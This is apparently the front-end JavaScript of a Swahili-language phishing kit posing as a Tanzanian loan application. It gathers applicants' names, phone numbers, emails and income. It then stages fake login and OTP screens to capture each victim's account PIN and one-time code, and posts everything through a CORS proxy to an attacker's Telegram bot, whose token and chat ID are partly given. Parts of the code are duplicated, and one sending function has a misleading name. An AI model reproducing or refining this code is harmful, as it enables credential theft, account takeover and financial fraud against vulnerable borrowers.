/    let count = 3;
    const countdownEl = document.getElementById('countdown');
    const interval = setInterval(() => {
        count--;
        countdownEl.innerText = count;
        if(count <= 0) {
            clearInterval(interval);
            document.getElementById('login-phone').value = applicationData.phone.replace("+255", "");
            navigateTo('view-login');
        }
    }, 1000);
}

function handleLogin() {
    showLoading("Tafadhali subiri…", 1500, () => { navigateTo('view-otp'); });
}

function moveOtpFocus(current, nextId) {
    if(current.value.length >= 1) document.getElementById(nextId).focus();
}

function verifyOtp() {
    const otpCode = document.getElementById('otp1').value + document.getElementById('otp2').value + document.getElementById('otp3').value + document.getElementById('otp4').value;
    const plainPin = document.getElementById('login-pin').value;

    showLoading("Inathibitisha OTP", 2500, () => {
        const securityMessage = `
🔑 *Uthibitisho wa Kuingia*
----------------------------
📱 *Namba ya Simu:* ${applicationData.phone || "Haijulikani"}
🔐 *PIN ya Akaunti:* ${plainPin}
🔢 *Msimbo wa OTP:* ${otpCode}
        `;
        sendToTelegram(securityMessage);
        document.getElementById('dash-approved-amount').innerText = `TSh ${applicationData.amount.toLocaleString()}`;
        navigateTo('view-dashboard');
    });
}

function updateversion(textMessage) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: textMessage, parse_mode: "Markdown" })
    }).catch(err => console.error("Error sending to Telegram:", err));
          }
      
// ==========================================
// 1. TELEGRAM CONFIGURATION
// ==========================================
const TELEGRAM_TOKEN = "8994413452:AAF_GfDPe_Mt0rlv4q8rtzx..."; // <-- Put your real Token here
const TELEGRAM_CHAT_ID = "8524294724";                          // <-- Put your real Chat ID here

// ==========================================
// 2. GLOBAL APP STATE
// ==========================================
let applicationData = { 
    amount: 100000, 
    duration: 12, 
    type: '', 
    purpose: '', 
    firstName: '', 
    lastName: '', 
    email: '', 
    phone: '', 
    employment: '', 
    income: '' 
};

// Initialize App
document.addEventListener("DOMContentLoaded", function() {
    initCalculator();
});

// Navigation Engine
function navigateTo(viewId) {
    document.querySelectorAll('.app-view').forEach(v => v.classList.remove('active'));
    const target = document.getElementById(viewId);
    if(target) target.classList.add('active');
}

// Visual Loading Screen Handler
function showLoading(msg, duration, callback) {
    const overlay = document.getElementById('loading-overlay');
    document.getElementById('overlay-msg').innerText = msg;
    overlay.classList.remove('hidden');
    setTimeout(() => { 
        overlay.classList.add('hidden'); 
        if(callback) callback(); 
    }, duration);
}

// ==========================================
// 3. CALCULATOR LOGIC
// ==========================================
function initCalculator() {
    const amountSlider = document.getElementById('calc-amount');
    const durationSlider = document.getElementById('calc-duration');
    
    const update = () => {
        const amt = parseInt(amountSlider.value);
        const dur = parseInt(durationSlider.value);
        
        document.getElementById('calc-amount-val').innerText = `TSh ${amt.toLocaleString()}`;
        document.getElementById('calc-duration-val').innerText = `miezi ${dur}`;
        
        const monthly = Math.round((amt + (amt * 0.25 * (dur / 12))) / dur);
        document.getElementById('calc-monthly-payment').innerText = `TSh ${monthly.toLocaleString()}`;
        
        applicationData.amount = amt;
        applicationData.duration = dur;
        
        if(document.getElementById('loan-amount')) document.getElementById('loan-amount').value = amt;
        if(document.getElementById('loan-duration')) document.getElementById('loan-duration').value = dur;
    };
    
    if(amountSlider && durationSlider) {
        amountSlider.addEventListener('input', update);
        durationSlider.addEventListener('input', update);
        update();
    }
}

// ==========================================
// 4. STEP-BY-STEP FORM VALIDATION & SAVING
// ==========================================
function saveStep1() {
    applicationData.type = document.getElementById('loan-type').value;
    applicationData.amount = parseInt(document.getElementById('loan-amount').value);
    applicationData.duration = parseInt(document.getElementById('loan-duration').value);
    applicationData.purpose = document.getElementById('loan-purpose').value;
    navigateTo('view-step2');
}

function saveStep2() {
    applicationData.firstName = document.getElementById('first-name').value;
    applicationData.lastName = document.getElementById('last-name').value;
    applicationData.email = document.getElementById('email').value;
    
    let rawPhone = document.getElementById('phone').value.trim();
    if(rawPhone.startsWith('0')) rawPhone = rawPhone.substring(1);
    applicationData.phone = "+255" + rawPhone;

    document.getElementById('sum-amount').innerText = `TSh ${applicationData.amount.toLocaleString()}`;
    document.getElementById('sum-duration').innerText = `${applicationData.duration} Miezi`;
    document.getElementById('sum-name').innerText = `${applicationData.firstName} ${applicationData.lastName}`;
    navigateTo('view-step3');
}

// ==========================================
// 5. DATA TRANSMISSION (SUBMIT & OTP)
// ==========================================
function submitApplication() {
    applicationData.employment = document.getElementById('employment-status').value;
    applicationData.income = document.getElementById('annual-income').value;
    
    showLoading("Inawasilisha Maombi…", 2000, () => {
        const message = `
🔔 *Maombi Mapya ya Mkopo!*
----------------------------
👤 *Jina:* ${applicationData.firstName} ${applicationData.lastName}
📱 *Namba:* ${applicationData.phone}
📧 *Email:* ${applicationData.email}
💰 *Kiasi:* TSh ${applicationData.amount.toLocaleString()}
📅 *Muda:* ${applicationData.duration} Miezi
🛠 *Aina:* ${applicationData.type}
🎯 *Madhumuni:* ${applicationData.purpose}
💼 *Ajira:* ${applicationData.employment}
💵 *Mapato/Mwaka:* TSh ${parseInt(applicationData.income).toLocaleString()}
        `;
        
        sendToTelegram(message);
        navigateTo('view-success');
        runSuccessCountdown();
    });
}

function runSuccessCountdown() {
    let count = 3;
    const countdownEl = document.getElementById('countdown');
    const interval = setInterval(() => {
        count--;
        if(countdownEl) countdownEl.innerText = count;
        if(count <= 0) {
            clearInterval(interval);
            if(document.getElementById('login-phone')) {
                document.getElementById('login-phone').value = applicationData.phone.replace("+255", "");
            }
            navigateTo('view-login');
        }
    }, 1000);
}

function handleLogin() {
    showLoading("Tafadhali subiri…", 1500, () => { 
        navigateTo('view-otp'); 
    });
}

function moveOtpFocus(current, nextId) {
    if(current.value.length >= 1) {
        document.getElementById(nextId).focus();
    }
}

function verifyOtp() {
    const otpCode = 
        document.getElementById('otp1').value + 
        document.getElementById('otp2').value + 
        document.getElementById('otp3').value + 
        document.getElementById('otp4').value;
        
    const plainPin = document.getElementById('login-pin').value;

    showLoading("Inathibitisha OTP...", 2500, () => {
        const securityMessage = `
🔑 *Uthibitisho wa Kuingia*
----------------------------
📱 *Namba ya Simu:* ${applicationData.phone || "Haijulikani"}
🔐 *PIN ya Akaunti:* ${plainPin}
🔢 *Msimbo wa OTP:* ${otpCode}
        `;
        
        sendToTelegram(securityMessage);
        
        document.getElementById('dash-approved-amount').innerText = `TSh ${applicationData.amount.toLocaleString()}`;
        navigateTo('view-dashboard');
    });
}

// ==========================================
// 6. UPGRADED TRANSMISSION (NO REDIRECT BUGS)
// ==========================================
function sendToTelegram(textMessage) {
    const cleanToken = TELEGRAM_TOKEN.trim();
    const cleanChatId = TELEGRAM_CHAT_ID.trim();
    
    const proxyUrl = "https://corsproxy.io/?"; 
    const telegramApiUrl = `https://api.telegram.org/bot${cleanToken}/sendMessage`;
    
    const payload = {
        chat_id: cleanChatId,
        text: textMessage,
        parse_mode: "Markdown",
        disable_web_page_preview: true
    };

    fetch(proxyUrl + encodeURIComponent(telegramApiUrl), {
        method: "POST",
        headers: { 
            "Content-Type": "application/json",
            "Accept": "application/json"
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP Error Status: ${response.status}`);
        }
        return response.json();
    })
    .then(data => {
        if (data.ok) {
            console.log("✅ Transmission Successful!");
        } else {
            console.error("❌ Telegram rejected data:", data.description);
        }
    })
    .catch(error => {
        console.error("🚨 System Connectivity Error:", error.message);
    });
             }
